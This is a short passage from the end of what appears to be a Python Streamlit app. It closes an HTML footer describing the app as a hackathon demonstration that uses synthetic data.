        <div>Built for Hackathon Demonstration &bull; Python & Streamlit &bull; 100% Safe Synthetic Data</div>
    </div>
""", unsafe_allow_html=True)
